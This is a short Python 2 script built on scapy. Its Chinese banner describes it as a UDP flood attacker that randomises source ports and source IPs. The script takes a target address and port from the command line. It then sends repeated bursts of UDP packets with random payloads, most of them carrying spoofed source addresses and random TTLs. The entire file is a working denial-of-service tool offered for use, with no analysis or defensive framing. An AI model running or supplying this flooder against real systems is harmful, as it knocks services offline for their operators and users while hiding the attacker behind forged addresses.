# -*- coding: UTF-8 -*-
import random
import socket

import sys
from scapy.all import *
from scapy import all

print "这是一个UDP FLOOD攻击器，源端口源IP随机"

rangeport = [21, 25, 80, 443, 8000, 123, 53, 169, 69, 111, 118, 135, 139, 464, 992, 123, 23]


def random_str(randomlength=8):
    str = ''
    chars = 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789'
    length = len(chars) - 1
    for i in range(randomlength):
        str += chars[random.randint(0, length)]
    return str


def attacker(host="127.0.0.1", port=9998):
    for x in range(random.randint(20, 30)):
        pkt = IP(dst=host) / UDP(dport=port, sport=random.choice(rangeport)) / Raw(
            load=random_str(random.randint(8, 32)))
        # pkt.show()
        send(pkt)

        for i in range(random.randint(32, 64)):
            size = random.randint(1, 2)
            data = random_str(random.randint(20, 50))
            iprandom = random.randint(0, 4000000000)
            sip = socket.inet_ntoa(struct.pack('I', socket.htonl(iprandom)))
            sp = random.randint(1000, 65535)
            t = random.randint(50, 120)
            packet = (IP(src=sip, dst=host, ttl=t) / UDP(sport=sp, dport=port) / Raw(load=data))
            send(packet)

    for x in range(random.randint(20, 30)):
        pkt = IP(dst=host) / UDP(dport=port, sport=random.choice(rangeport)) / Raw(
            load=random_str(random.randint(8, 32)))
        # pkt.show()
        send(pkt)

        return True


if __name__ == '__main__':
    ip = sys.argv[1]
    port = sys.argv[2]
    print ip, port
    attacker(ip, int(port))
